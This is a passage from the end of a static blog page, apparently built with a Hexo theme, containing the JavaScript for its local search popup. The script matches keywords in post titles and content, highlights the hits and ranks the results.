              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
